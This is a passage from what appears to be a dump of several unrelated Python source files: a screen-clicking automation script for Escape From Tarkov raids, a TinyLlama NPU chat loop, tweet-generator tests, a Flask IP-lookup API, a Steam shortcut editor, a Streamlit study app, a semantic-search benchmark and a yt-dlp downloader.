print(Fore.RED + \"Please enter a number between 1-7.\")\r\n        except ValueError:\r\n            print(Fore.RED + \"Please enter a valid number.\")\r\n\r\ndef get_run_count():\r\n    while True:\r\n        try:\r\n            count = int(input(Fore.YELLOW + \"\\nHow many times would you like the script to run? (1-100): \"))\r\n            if 1 <= count <= 100:\r\n                return count\r\n            else:\r\n                print(Fore.RED + \"Please enter a number between 1 and 100.\")\r\n        except ValueError:\r\n            print(Fore.RED + \"Please enter a valid number.\")\r\n\r\ndef find_images(image_names):\r\n    for image_name in image_names:\r\n        image_path = os.path.join(\"images\", image_name)\r\n        try:\r\n            location = pyautogui.locateOnScreen(image_path, confidence=0.8)\r\n            if location is not None:\r\n                return True\r\n        except Exception as e:\r\n            print(Fore.GREEN + f\"{Fore.RED} Loading Into Raid :) ...\")\r\n    return False\r\n\r\ndef click_at(x, y):\r\n    try:\r\n        pyautogui.click(x, y)\r\n        time.sleep(0.5)\r\n        print(Fore.GREEN + f\"Clicked at coordinates ({x}, {y}).\")\r\n    except Exception as e:\r\n        print(Fore.RED + f\"Error clicking at coordinates ({x}, {y}): {e}\")\r\n\r\ndef run_script(map_choice, current_run, total_runs):\r\n    print(Fore.CYAN + f\"\\nStarting run {current_run} of {total_runs}\")\r\n    print(Fore.YELLOW + \"Please ensure that Escape From Tarkov is running.\")\r\n    print(Fore.YELLOW + \"You have 5 seconds to prepare before the script starts.\")\r\n    time.sleep(5)\r\n\r\n    map_coords = get_map_coordinates(map_choice)\r\n    if not map_coords:\r\n        print(Fore.RED + \"Invalid map selection!\")\r\n        return False\r\n\r\n    # Initial clicks\r\n    print(Fore.CYAN + \"Performing initial clicks...\")\r\n    click_at(954, 643)  # 1st click\r\n    click_at(958, 946)  # 2nd click\r\n\r\n    print(Fore.CYAN + \"Waiting for map selection screen...\")\r\n    time.sleep(2)\r\n\r\n    # Click the map coordinates\r\n    print(Fore.CYAN + f\"Clicking selected map at coordinates {map_coords}...\")\r\n    click_at(*map_coords)\r\n    print(Fore.GREEN + \"Map selected!\")\r\n    time.sleep(0.5)\r\n\r\n    click_at(1251, 1004)  # 4th click\r\n    time.sleep(0.5)\r\n\r\n    # Step 2: Wait for specific images to appear\r\n    print(Fore.CYAN + \"Waiting for specific images to appear...\")\r\n    while not find_images([\"ICON IN RAID.png\", \"HUD ELEMENTS.png\", \"TOP LEFT PLAYER ICON.png\"]):\r\n        time.sleep(1)\r\n\r\n    print(Fore.GREEN + \"One of the images found! Continuing with the script...\")\r\n\r\n    # Spacebar spam until \"RAID ENDED.png\" is found\r\n    print(Fore.RED + \"Pressing spacebar repeatedly until 'RAID ENDED.png' is found...\")\r\n    while not find_images([\"RAID ENDED.png\"]):\r\n        pyautogui.press('space')\r\n        time.sleep(0.5)\r\n\r\n    print(Fore.GREEN + \"'RAID ENDED.png' found! Continuing the process.\")\r\n\r\n    # Final clicks and actions\r\n    click_at(954, 1034)  # 5th click\r\n    print(Fore.CYAN + \"5th mouse click executed.\")\r\n\r\n    # Wait for \"CLICK Y.png\" and press 'y'\r\n    print(Fore.CYAN + \"Waiting for 'CLICK Y.png' to appear...\")\r\n    while not find_images([\"CLICK Y.png\"]):\r\n        time.sleep(1)\r\n\r\n    print(Fore.GREEN + \"'CLICK Y.png' found! Pressing 'y' key.\")\r\n    pyautogui.press('y')\r\n\r\n    # Restart process when specific images are found\r\n    print(Fore.RED + \"Process complete. Waiting to restart...\")\r\n    while not find_images([\"ATTENTION.png\", \"CHARACTER.png\", \"TRADING.png\", \"HIDEOUT.png\", \"EFT.png\"]):\r\n        time.sleep(1)\r\n\r\n    print(Fore.GREEN + \"Restart images found! Restarting the script...\")\r\n\r\nif __name__ == \"__main__\":\r\n    while True:\r\n        map_choice = display_map_menu()\r\n        if map_choice == 7:\r\n            print(Fore.CYAN + \"Exiting script. Goodbye!\")\r\n            break\r\n\r\n        run_count = get_run_count()\r\n\r\n        for current_run in range(1, run_count + 1):\r\n            run_script(map_choice, current_run, run_count)\r\n",
    "from transformers import AutoTokenizer, AutoModelForCausalLM, TextStreamer\nimport intel_npu_acceleration_library\nfrom intel_npu_acceleration_library.compiler import CompilerConfig, int4, int8\nimport torch\nimport os\nimport warnings\n\nwarnings.simplefilter(action='ignore', category=FutureWarning)\n\n\ndef compile_model(model_id, dtype):\n    # Compile for NPU acceleration using Intel NPU Acceleration Library\n    model = AutoModelForCausalLM.from_pretrained(model_id, use_cache=True, weights_only=True).eval()\n    torch_dtype = torch.int8 if dtype == \"int8\" else torch.float16\n    with torch.no_grad():\n        compiler_conf = CompilerConfig(dtype=torch_dtype)\n        model = intel_npu_acceleration_library.compile(model, compiler_conf)\n    return model\n\n\ndef load_model(model_id, dtype):\n    PATH = os.path.join(\"models\", model_id, dtype)\n    filename = os.path.join(PATH, \"model.pth\")\n    os.makedirs(PATH, exist_ok=True)\n\n    if not os.path.exists(filename):\n        model = compile_model(model_id, dtype)\n        torch.save(model, filename)\n    else:\n        model = torch.load(filename).eval()\n    return model\n\n\ndef generate_response(model, tokenizer, query):\n    \"\"\"Generate response using model and tokenizer\"\"\"\n    try:\n        messages = [\n            {\n                \"role\": \"system\",\n                \"content\": \"\",\n            },\n            {\"role\": \"user\", \"content\": query},\n        ]\n\n        input_ids = tokenizer.apply_chat_template(\n            messages, add_generation_prompt=True, return_tensors=\"pt\"\n        ).to(model.device)\n\n        terminators = [tokenizer.eos_token_id, tokenizer.convert_tokens_to_ids(\"<|eot_id|>\")]\n        attention_mask = torch.ones_like(input_ids)\n\n        outputs = model.generate(\n            input_ids,\n            attention_mask=attention_mask,\n            max_new_tokens=256,\n            eos_token_id=terminators,\n            do_sample=False,\n            streamer=TextStreamer(tokenizer, skip_special_tokens=True, skip_prompt=True),\n        )\n\n        return tokenizer.decode(outputs[0])\n    except Exception as e:\n        print(f\"Error generating text: {e}\")\n        return None\n\n\nif __name__ == \"__main__\":\n\n    model_id = \"TinyLlama/TinyLlama-1.1B-Chat-v1.0\"\n    dtype = \"int8\"\n\n    model = load_model(model_id, dtype)\n    tokenizer = AutoTokenizer.from_pretrained(model_id)\n    tokenizer.pad_token_id = tokenizer.eos_token_id\n\n    while True:\n        query = input(\"> \")\n        response = generate_response(model, tokenizer, query)\n        if response is not None:\n            print(response)\n\n",
    "import unittest\nfrom unittest.mock import patch, MagicMock\nimport os\nimport random\nimport logging\nfrom authenticate import open_ai_auth\nfrom generate import (\n    generate_post_topic,\n    post_process_tweet,\n    find_image_for_topic,\n    gpt_generate_tweet,\n    find_ai_generated_image,\n    \n)\n\nclass TestFunctions(unittest.TestCase):\n    \n    @patch('random.choice')\n    def test_generate_post_topic(self, mock_choice):\n        mock_choice.return_value = \"Benefits of Automating Social Media Posts\"\n        result = generate_post_topic()\n        self.assertEqual(result, \"Benefits of Automating Social Media Posts\")\n\n    def test_post_process_tweet(self):\n        tweet = \"This is a tweet without hashtags.\"\n        result = post_process_tweet(tweet)\n        self.assertIn(\"#VR\", result)\n        self.assertIn(\"#AR\", result)\n\n        tweet_with_hashtags = \"This is a tweet with #VR hashtag.\"\n        result = post_process_tweet(tweet_with_hashtags)\n        self.assertEqual(result, tweet_with_hashtags[:250])\n\n    \n    @patch('os.path.exists')\n    @patch('os.path.isfile')\n    @patch('os.listdir')\n    def test_find_image_for_topic(self, mock_listdir, mock_isfile, mock_exists):\n        mock_exists.return_value = True\n        mock_listdir.return_value = [\"vr_image.png\", \"ar_image.jpg\"]\n        mock_isfile.return_value = True\n\n        result = find_image_for_topic(\"vr\")\n        self.assertEqual(result, (\"images/vr_image.png\", \"vr\"))\n\n    @unittest.skip(\"Skipping test_gpt_generate_tweet\")\n    @patch('open_ai_auth.chat.completions.create')\n    def test_gpt_generate_tweet(self, mock_ai_client):\n        mock_ai_client.return_value = {\n            \"choices\": [{\"message\": {\"content\": \"This is a GPT-generated tweet.\"}}]\n        }\n\n        result = gpt_generate_tweet(\"Test topic\")\n        self.assertEqual(result, \"This is a GPT-generated tweet.\")\n\n    @patch('os.path.exists')\n    @patch('os.path.isfile')\n    def test_find_ai_generated_image(self, mock_isfile, mock_exists):\n        mock_exists.return_value = True\n        mock_isfile.return_value = True\n\n        result = find_ai_generated_image(\"topic\")\n        self.assertEqual(result, \"images/ai_gen_image.png\")\n    \nif __name__ == \"__main__\":\n    unittest.main()\n",
    "from flask import Flask, request, send_from_directory, url_for, jsonify\nfrom flask_cors import CORS\nfrom app.api import get_ip_info\nimport os\nfrom functools import wraps\nimport requests\nimport logging\nfrom datetime import datetime\nimport json\nimport pytz\nfrom collections import defaultdict\nimport time\n\n# \u914d\u7f6e\u65e5\u5fd7\nlogging.basicConfig(\n    format='%(asctime)s [%(levelname)s] %(message)s',\n    level=logging.INFO\n)\nlogger = logging.getLogger(__name__)\n\n# \u521b\u5efaFlask\u5e94\u7528\napp = Flask(__name__, static_folder='../static')\nCORS(app)\n\n# \u8bbe\u7f6e\u65f6\u533a\u4e3a\u4e2d\u56fd\u4e0a\u6d77\nTIMEZONE = pytz.timezone('Asia/Shanghai')\n\n# \u8bbf\u95ee\u9650\u5236\u914d\u7f6e\nDAILY_LIMIT = int(os.getenv('DAILY_LIMIT', '5'))  # \u9ed8\u8ba4\u6bcf\u65e5\u8bbf\u95ee\u9650\u5236\u6b21\u6570\naccess_counts = defaultdict(lambda: {'count': 0, 'reset_time': 0})\n\ndef reset_daily_count():\n    \"\"\"\u91cd\u7f6e\u6bcf\u65e5\u8bbf\u95ee\u8ba1\u6570\"\"\"\n    current_time = time.time()\n    for ip in list(access_counts.keys()):\n        if current_time - access_counts[ip]['reset_time'] >= 86400:  # 24\u5c0f\u65f6\n            del access_counts[ip]\n\ndef check_access_limit(ip):\n    \"\"\"\u68c0\u67e5\u8bbf\u95ee\u9650\u5236\"\"\"\n    current_time = time.time()\n    \n    # \u5982\u679c\u662f\u65b0\u7684\u4e00\u5929\uff0c\u91cd\u7f6e\u8ba1\u6570\n    if current_time - access_counts[ip]['reset_time'] >= 86400:\n        access_counts[ip] = {'count': 1, 'reset_time': current_time}\n        return True\n    \n    # \u68c0\u67e5\u662f\u5426\u8d85\u8fc7\u9650\u5236\n    if access_counts[ip]['count'] >= DAILY_LIMIT:\n        return False\n    \n    # \u589e\u52a0\u8ba1\u6570\n    access_counts[ip]['count'] += 1\n    return True\n\ndef log_request(ip, endpoint, result=None, error=None):\n    \"\"\"\u8bb0\u5f55\u8bf7\u6c42\u65e5\u5fd7\"\"\"\n    current_time = datetime.now(TIMEZONE)\n    log_data = {\n        'timestamp': current_time.strftime('%Y-%m-%d %H:%M:%S %z'),\n        'client_ip': request.remote_addr,\n        'query_ip': ip,\n        'endpoint': endpoint,\n        'user_agent': request.headers.get('User-Agent', '-'),\n        'referer': request.headers.get('Referer', '-')\n    }\n    \n    if error:\n        log_data['error'] = str(error)\n        logger.error(json.dumps(log_data))\n    else:\n        if result:\n            log_data['result'] = {k: v for k, v in result.items() if k in ['country', 'city', 'isp']}\n        logger.info(json.dumps(log_data))\n\ndef get_real_ip():\n    \"\"\"\u83b7\u53d6\u771f\u5b9eIP\u5730\u5740\"\"\"\n    # \u4f18\u5148\u4ece\u8bf7\u6c42\u5934\u83b7\u53d6\n    ip = request.headers.get('X-Real-IP') or \\\n         request.headers.get('X-Forwarded-For') or \\\n         request.remote_addr\n    \n    # \u5982\u679c\u662f\u672c\u5730IP\uff0c\u5c1d\u8bd5\u4f7f\u7528\u5907\u7528\u670d\u52a1\n    if ip in ['127.0.0.1', 'localhost']:\n        try:\n            # \u5907\u7528IP\u83b7\u53d6\u670d\u52a1\n            response = requests.get('https://ipv4_cm.itdog.cn', timeout=3)\n            if response.status_code == 200:\n                data = response.json()\n                if data.get('type') == 'success':\n                    return data.get('ip')\n        except Exception as e:\n            logger.error(f\"Error getting IP from backup API: {str(e)}\")\n            return None\n    \n    return ip\n\ndef check_auth(f):\n    \"\"\"\u9a8c\u8bc1\u57df\u540d\u548cIP\u6388\u6743\u7684\u88c5\u9970\u5668\"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        # \u83b7\u53d6\u5141\u8bb8\u7684\u57df\u540d\u5217\u8868\n        allowed_domains = os.getenv('ALLOWED_DOMAINS', '*').split(',')\n        # \u83b7\u53d6\u5141\u8bb8\u7684IP\u5217\u8868\n        allowed_ips = os.getenv('ALLOWED_IPS', '127.0.0.1,localhost').split(',')\n        \n        # \u83b7\u53d6\u8bf7\u6c42\u7684\u57df\u540d\u548cIP\n        origin = request.headers.get('Origin', '')\n        client_ip = request.remote_addr\n        \n        # \u68c0\u67e5\u662f\u5426\u662f\u672c\u5730IP\n        is_local = client_ip in ['127.0.0.1', 'localhost']\n        \n        # \u68c0\u67e5\u57df\u540d\u662f\u5426\u5728\u5141\u8bb8\u5217\u8868\u4e2d\uff08'*' \u8868\u793a\u5141\u8bb8\u6240\u6709\u57df\u540d\uff09\n        domain_allowed = '*' in [d.strip() for d in allowed_domains] or \\\n                        any(domain.strip() in origin for domain in allowed_domains if domain.strip())\n        \n        # \u68c0\u67e5IP\u662f\u5426\u5728\u5141\u8bb8\u5217\u8868\u4e2d\n        ip_allowed = client_ip in [ip.strip() for ip in allowed_ips]\n        \n        # \u5982\u679c\u662f\u672c\u5730IP\u6216\u5728\u5141\u8bb8\u5217\u8868\u4e2d\uff0c\u76f4\u63a5\u901a\u8fc7\n        if is_local or domain_allowed or ip_allowed:\n            return f(*args, **kwargs)\n            \n        # \u5bf9\u4e8e\u672a\u6388\u6743\u7684\u8bf7\u6c42\uff0c\u5e94\u7528\u8bbf\u95ee\u9650\u5236\n        reset_daily_count()  # \u6e05\u7406\u8fc7\u671f\u7684\u8ba1\u6570\n        if not check_access_limit(client_ip):\n            error_msg = '\u60a8\u4eca\u65e5\u7684\u514d\u8d39\u4f7f\u7528\u6b21\u6570\u5df2\u8fbe\u4e0a\u9650'\n            log_request(None, request.endpoint, error=error_msg)\n            return jsonify({\n                'error': error_msg,\n                'message': '\u8bf7\u8054\u7cfb\u7ba1\u7406\u5458\u83b7\u53d6\u6388\u6743'\n            }), 403\n        \n        return f(*args, **kwargs)\n    return decorated_function\n\n@app.route('/')\ndef index():\n    return send_from_directory(app.static_folder, 'index.html')\n\n@app.route('/static/<path:filename>')\ndef serve_static(filename):\n    return send_from_directory(app.static_folder, filename)\n\n@app.route('/api/current')\n@check_auth\ndef current_ip():\n    \"\"\"\u83b7\u53d6\u5f53\u524d\u8bbf\u95ee\u8005\u7684IP\u5730\u5740\"\"\"\n    ip = get_real_ip()\n    if not ip:\n        error_msg = '\u65e0\u6cd5\u83b7\u53d6\u771f\u5b9eIP\u5730\u5740'\n        log_request(None, 'current_ip', error=error_msg)\n        return jsonify({'error': error_msg}), 400\n    \n    log_request(ip, 'current_ip')\n    return jsonify({'ip': ip})\n\n@app.route('/api/<ip_address>')\n@check_auth\ndef ip_info(ip_address):\n    try:\n        result = get_ip_info(ip_address)\n        # \u79fb\u9664ASN\u4fe1\u606f\n        if 'asnumber' in result:\n            del result['asnumber']\n        \n        log_request(ip_address, 'ip_info', result=result)\n        return jsonify(result)\n    except Exception as e:\n",
    "#!/usr/bin/env python\n\nimport datetime\nimport json\nimport logging\nimport os\nimport platform\n\nimport vdf\n\nfrom steam_vdf import utils\n\nlogger = logging.getLogger(\"cli\")\n\n\ndef add_shortcut(args, selected_library):\n    \"\"\"\n    Add a shortcut to the shortcuts.vdf file.\n    \"\"\"\n    shortcuts_vdf = os.path.join(selected_library, \"userdata\")\n\n    if not os.path.exists(shortcuts_vdf):\n        logger.error(\"No userdata directory found at %s\", shortcuts_vdf)\n        print(\"No Steam user data found.\")\n        exit(1)\n\n    user_dirs = [\n        d\n        for d in os.listdir(shortcuts_vdf)\n        if os.path.isdir(os.path.join(shortcuts_vdf, d))\n    ]\n\n    if not user_dirs:\n        logger.error(\"No Steam users found in userdata directory\")\n        print(\"No Steam users found.\")\n        exit(1)\n\n    if len(user_dirs) > 1:\n        user_names = get_steam_user_names(args, selected_library)\n        print(\"\\nMultiple Steam users found. Please choose one:\")\n        for idx, user_dir in enumerate(user_dirs, 1):\n            user_info = user_names.get(\n                user_dir,\n                {\n                    \"PersonaName\": \"Unknown Account\",\n                    \"AccountName\": \"Unknown Account\",\n                },\n            )\n            persona_name = user_info[\"PersonaName\"]\n            account_name = user_info[\"AccountName\"]\n\n            if account_name != \"Unknown Account\":\n                print(f\"{idx}. {user_dir} - {persona_name} ({account_name})\")\n            else:\n                print(f\"{idx}. {user_dir} - {persona_name}\")\n\n        while True:\n            try:\n                choice = int(input(\"\\nEnter user number: \")) - 1\n                if 0 <= choice < len(user_dirs):\n                    user_dir = user_dirs[choice]\n                    break\n                else:\n                    logger.info(\n                        \"Please enter a number between 1 and %s\",\n                        len(user_dirs),\n                    )\n            except ValueError:\n                logger.info(\"Please enter a valid number\")\n    else:\n        user_dir = user_dirs[0]\n        user_names = get_steam_user_names(args, selected_library)\n        account_name = user_names.get(user_dir, \"Unknown Account\")\n        logger.info(f\"Using only available user: {user_dir} ({account_name})\")\n\n    shortcuts_vdf = os.path.join(\n        shortcuts_vdf, user_dir, \"config\", \"shortcuts.vdf\"\n    )\n\n    try:\n        if os.path.exists(shortcuts_vdf):\n            with open(shortcuts_vdf, \"r\", encoding=\"utf-8\"):\n                shortcuts = load_shortcuts_file(args, shortcuts_vdf)\n                new_entry = add_shortcut_entry()\n                if new_entry:\n                    shortcuts = add_shortcut_to_shortcuts(shortcuts, new_entry)\n                    if save_shortcuts(shortcuts_vdf, shortcuts):\n                        logger.info(\"Shortcut added successfully\")\n                    else:\n                        logger.error(\"Failed to save shortcuts\")\n    except Exception as e:\n        logger.error(\"Error loading shortcuts.vdf: %s\", e)\n        exit(1)\n\n\ndef dump_vdf_to_json(args, vdf_data, vdf_path):\n    \"\"\"\n    Dump VDF data to JSON file in /tmp directory\n    The JSON filename will include the source directory (steamapps or config)\n    \"\"\"\n\n    if not args.dump_vdfs:\n        return\n\n    if not args.dump_vdfs:\n        return\n\n    # Get the base filename and parent directory\n    base_name = os.path.basename(vdf_path)\n    parent_dir = os.path.basename(os.path.dirname(vdf_path))\n\n    # If it's libraryfolders.vdf, use parent directory in name\n    if base_name == \"libraryfolders.vdf\":\n        json_filename = f\"steam-{parent_dir}-vdf.json\"\n    else:\n        # For other files (like loginusers.vdf), use the base name without .vdf\n        json_filename = f\"steam-{os.path.splitext(base_name)[0]}.json\"\n\n    json_path = os.path.join(\"/tmp\", json_filename)\n\n    try:\n        with open(json_path, \"w\", encoding=\"utf-8\") as f:\n            json.dump(vdf_data, f, indent=4)\n        logger.info(\"VDF data ({base_name}) dumped to JSON at: %s\", json_path)\n        return True\n    except Exception as e:\n        logger.error(\"Error dumping VDF to JSON: %s\", e)\n        return False\n\n\ndef delete_shortcut(args, library_path):\n    \"\"\"\n    Delete an existing shortcut after selecting user and shortcut\n    \"\"\"\n    userdata_path = os.path.join(library_path, \"userdata\")\n    if not os.path.exists(userdata_path):\n        logger.error(\"No userdata directory found at: %s\", userdata_path)\n        return False\n\n    user_dirs = [\n        d\n        for d in os.listdir(userdata_path)\n        if os.path.isdir(os.path.join(userdata_path, d))\n    ]\n\n    if not user_dirs:\n        logger.error(\"No Steam users found in userdata directory\")\n        return False\n\n    user_names = get_steam_user_names(args, library_path)\n\n    # Present user selection\n    print(\"\\nAvailable Steam users:\")\n    for idx, user_dir in enumerate(user_dirs, 1):\n        user_info = user_names.get(\n            user_dir,\n          ",
    "import streamlit as st\nfrom utils.st_utils import extract_text_from_pdfs,display_enhanced_summary,generate_summary\nimport json\n\nst.set_page_config(page_title=\"AI Study Buddy\", layout=\"wide\")\nst.sidebar.info(\"Select a page to master your study material!\")\n\n# Create a layout with the title and logo closer together, centered\ncol1, col2, col3 = st.columns([2, 6, 1])  # Adjust the column widths for alignment\n\nwith col1:\n    st.write(\"\")  # Empty column for spacing\n\nwith col2:\n    st.markdown(\"\"\"\n        <div style=\"display: flex; align-items: center; justify-content: center;\">\n            <h1 style=\"font-family: 'Roboto', sans-serif; color: #2c3e50; font-size: 36px; margin: 0; display: inline-block;\">\n                \ud83d\udcda Your AI-Powered Personal Tutor\n            </h1>\n            <img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCWy4eBnySj4q7XYFJTI-MhPtKNbHhjildlg&s\"  alt=\"Mistral Logo\" style=\"width: 50px; margin-left: 0px;\">\n        </div>\n    \"\"\", unsafe_allow_html=True)\n\nwith col3:\n    st.write(\"\")  # Empty column for spacing\n\n\n\n\n\n\nst.markdown(\"\"\"\n    <style>\n        .centered-box {\n            background-color: #f9f9f9;\n            border-radius: 10px;\n            padding: 20px;\n            text-align: center;\n            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);\n            margin: 20px auto;\n            max-width: 800px;\n        }\n        .btn-container {\n            margin-top: 30px;\n            display: flex;\n            justify-content: space-around;\n            flex-wrap: wrap;\n        }\n        .btn {\n            color: white; /* White text for contrast */\n            padding: 15px 30px; /* Larger padding for better clickability */\n            border-radius: 25px; /* Rounded corners for a modern look */\n            font-size: 16px; /* Increase font size for readability */\n            font-weight: bold;\n            text-decoration: none;\n            text-align: center;\n            transition: all 0.3s ease; /* Smooth hover effect */\n            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Subtle shadow for depth */\n            margin: 10px; /* Spacing between buttons */\n            border: none; /* Remove border */\n        }\n        .btn:hover {\n            background-color: #16a085; /* Slightly darker teal on hover */\n            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15); /* Deeper shadow on hover */\n            transform: translateY(-2px); /* Hover \"lift\" effect */\n        }\n        .upload-box {\n            text-align: center;\n            margin-bottom: 20px;\n        }\n    </style>\n\"\"\", unsafe_allow_html=True)\n\n# Introductory section\nst.markdown(\"\"\"\n    <div class=\"centered-box\">\n        <h2>Step 1: Upload Your Study Material</h2>\n        <p>Upload one or more PDFs to generate instant summaries, study plans, and quizzes tailored just for you!</p>\n    </div>\n\"\"\", unsafe_allow_html=True)\n\n# File uploader\nuploaded_files = st.file_uploader(\"Upload one or more PDFs\", type=[\"pdf\"], accept_multiple_files=True)\n\nif uploaded_files:\n    # Spinning loader for processing\n    with st.spinner(\"Hang tight! We're summarizing your documents...\"):\n\n        documents = extract_text_from_pdfs(uploaded_files)\n\n        # Generate summaries\n        summaries = {}\n        for doc in documents:\n            summaries[doc[\"name\"]] = generate_summary(doc[\"content\"])\n\n        # Save summaries in session state\n        st.session_state[\"summaries\"] = summaries\n        st.session_state[\"documents\"] = documents\n\n    # Display summaries using columns\n    st.markdown(\"<h3 style='text-align: center;'>Document Summaries</h3>\", unsafe_allow_html=True)\n    cols = st.columns(len(summaries))  # Create as many columns as there are summaries\n    for i, (name, summary) in enumerate(summaries.items()):\n        with cols[i]:  # Place each summary in its respective column\n            st.markdown(f\"Document Name: **{name}**\")\n            display_enhanced_summary(json.loads(summary))\n\n    # Success message\n    st.success(\"Documents processed successfully! Use the sidebar to explore quiz generation, coding questions, and flashcards.\")\n\n",
    "\"\"\"\nThis is a simple application for sentence embeddings: semantic search\n\nWe have a corpus with various sentences. Then, for a given query sentence,\nwe want to find the most similar sentence in this corpus.\n\nThis script outputs for various queries the top 5 most similar sentences in the corpus.\n\"\"\"\n\nimport argparse\n\nimport torch\nimport json\nfrom sentence_transformers import SentenceTransformer, CrossEncoder\nimport sentence_transformers.util as util\nimport numpy as np\n\n# Load model\nbiencoder = SentenceTransformer(\"all-roberta-large-v1\")\n# crossencoder = CrossEncoder(\"cross-encoder/ms-marco-MiniLM-L-6-v2\", default_activation_function=torch.nn.Sigmoid())\ncrossencoder = CrossEncoder(\"cross-encoder/stsb-roberta-large\")\n\n# Load corpus\nwith open(\"data/test_corpus.json\", \"r\", encoding=\"utf-8\") as f:\n    corpus = json.load(f)\n\n# Encode corpus\ncorpus_embeddings = biencoder.encode(corpus, convert_to_tensor=True)\n\n# Load benchmark\nwith open(\"data/test_benchmark_addids.json\", \"r\", encoding=\"utf-8\") as f:\n    benchmark = json.load(f)\n\n# Filter queries and answer IDs based on item_count\nn = 50\nqueries = [\n    list(item['survey'].values())[0] \n    for item in benchmark \n    if n < item['item_count'] < 200\n]\nanswer_ids = [\n    item['citations_ids'] \n    for item in benchmark \n    if n < item['item_count'] < 200\n]\n\n# Encode queries\nquery_embeddings = biencoder.encode(queries, convert_to_tensor=True)\n\n# Perform semantic search\nresults = util.semantic_search(query_embeddings, corpus_embeddings, top_k=n)\n\n# Extract search IDs\nsearch_ids = [[hit['corpus_id'] for hit in result] for result in results]\nresults_for_crossencoder = [[(q,corpus[id]) for id in ids] for q, ids in zip(queries,search_ids)]\n\ntop_k = 30\ncross_search_ids = []\nfor list_of_pairs, ids in zip(results_for_crossencoder, search_ids):\n    crossencoder_scores = crossencoder.predict(list_of_pairs)\n    crossencoder_scores_tensor = torch.tensor(crossencoder_scores) \n    scores, indices = torch.topk(crossencoder_scores_tensor, k=top_k)\n    search_ids_2 = [ids[idx] for idx in indices]\n    cross_search_ids.append(search_ids_2)\n\n# Calculate biencoder accuracy\naccuracy = []\nfor ans, search in zip(answer_ids, search_ids):\n    common_count = len(set(ans) & set(search))\n    accuracy.append(common_count / n)\n\n# Print metrics\nprint(\"below is results of biencoder\")\nprint(f\"mean of accuracy @{n} = {np.mean(accuracy)}\")\nprint(f\"25 quantile of accuracy @{n} = {np.quantile(accuracy, 0.25)}\")\nprint(f\"50 quantile of accuracy @{n} = {np.quantile(accuracy, 0.50)}\")\nprint(f\"75 quantile of accuracy @{n} = {np.quantile(accuracy, 0.75)}\")\n\n# Calculate biencoder + crossencoder accuracy\naccuracy = []\nfor ans, search in zip(answer_ids, cross_search_ids):\n    common_count = len(set(ans) & set(search))\n    accuracy.append(common_count / n)\n\n# Print metrics\nprint(\"below is results of biencoder + crossencoder\")\nprint(f\"mean of accuracy @{top_k} = {np.mean(accuracy)}\")\nprint(f\"25 quantile of accuracy @{top_k} = {np.quantile(accuracy, 0.25)}\")\nprint(f\"50 quantile of accuracy @{top_k} = {np.quantile(accuracy, 0.50)}\")\nprint(f\"75 quantile of accuracy @{top_k} = {np.quantile(accuracy, 0.75)}\")\n\n\n",
    "import sys\nimport os\nfrom PyQt5 import QtWidgets, QtGui\nfrom PyQt5.QtCore import Qt, QThread, pyqtSignal\nfrom PyQt5.QtWidgets import (\n    QApplication,\n    QMainWindow,\n    QFileDialog,\n    QMessageBox,\n    QLabel,\n    QPushButton,\n    QLineEdit,\n    QComboBox,\n    QVBoxLayout,\n    QHBoxLayout,\n    QWidget,\n    QProgressBar\n)\nimport traceback\nimport yt_dlp\nimport subprocess\n\n\nclass DownloadThread(QThread):\n    status_updated = pyqtSignal(str, str)\n    progress_updated = pyqtSignal(int)\n    download_error = pyqtSignal(str)\n\n    QUALITY_FORMAT_MAP = {\n        \"Only audio (.mp3)\": \"bestaudio/best\",\n        \"Video (144p)\": \"bestvideo[height<=144]+bestaudio/best\",\n        \"Video (240p)\": \"bestvideo[height<=240]+bestaudio/best\",\n        \"Video (360p)\": \"bestvideo[height<=360]+bestaudio/best\",\n        \"Video (480p)\": \"bestvideo[height<=480]+bestaudio/best\",\n        \"Video (720p HD)\": \"bestvideo[height<=720]+bestaudio/best\",\n        \"Video (1080p Full HD)\": \"bestvideo[height<=1080]+bestaudio/best\",\n        \"Video (1440p 2K)\": \"bestvideo[height<=1440]+bestaudio/best\",\n        \"Video (2160p 4K)\": \"bestvideo[height<=2160]+bestaudio/best\",\n        \"Video (4320p 8K)\": \"bestvideo[height<=4320]+bestaudio/best\",\n        \"Video (Best quality)\": \"bestvideo+bestaudio/best\"\n    }\n\n    def __init__(self, urls, save_path, quality, ffmpeg_path, cookies_path=None, parent=None):\n        super(DownloadThread, self).__init__(parent)\n        self.urls = urls\n        self.save_path = save_path\n        self.quality = quality\n        self.ffmpeg_path = ffmpeg_path\n        self.cookies_path = cookies_path\n\n    def progress_hook(self, d):\n        try:\n            if d['status'] == 'downloading':\n                percent = d.get('_percent_float', 0) * 100\n                self.progress_updated.emit(int(percent))\n                percent_str = d.get('_percent_str', '0.0%').strip()\n                speed = d.get('_speed_str', 'N/A').strip()\n                eta = d.get('_eta_str', 'N/A').strip()\n                self.status_updated.emit(\n                    f\"Loading: {percent_str} | Speed: {speed} | ETA: {eta}\", 'blue'\n                )\n            elif d['status'] == 'finished':\n                self.status_updated.emit(\"Upload complete. Starting file processing...\", 'green')\n        except Exception as e:\n            error_msg = f\"Error in progress_hook: {e}\"\n            self.download_error.emit(error_msg)\n\n    def run(self):\n        try:\n\n            format_option = self.QUALITY_FORMAT_MAP.get(self.quality, 'best')\n            ydl_opts = {\n                'outtmpl': os.path.join(self.save_path, '%(title)s.%(ext)s'),\n                'progress_hooks': [self.progress_hook],\n                'verbose': False,\n                'quiet': True,\n                'ignoreerrors': False,\n                'retries': 10,\n                'format': format_option,\n                'ffmpeg_location': self.ffmpeg_path,\n            }\n\n\n            if self.quality == \" (Only audio.mp3)\":\n                ydl_opts.update({\n                    'postprocessors': [{\n                        'key': 'FFmpegExtractAudio',\n                        'preferredcodec': 'mp3',\n                        'preferredquality': '192',\n                    }],\n                    'postprocessor_args': [\n                        '-ar', '16000'\n                    ],\n                    'prefer_ffmpeg': True,\n                    'keepvideo': False,\n                })\n\n\n            if self.cookies_path and os.path.exists(self.cookies_path):\n                ydl_opts['cookies'] = self.cookies_path\n                self.status_updated.emit(f\"Cookies from are used.: {self.cookies_path}\", 'green')\n            elif self.cookies_path:\n                self.download_error.emit(f\"Cookie file not found at path: {self.cookies_path}\")\n                return\n\n\n            self.status_updated.emit(f\"Quality used: {self.quality}\", 'blue')\n            self.status_updated.emit(f\"Path to ffmpeg: 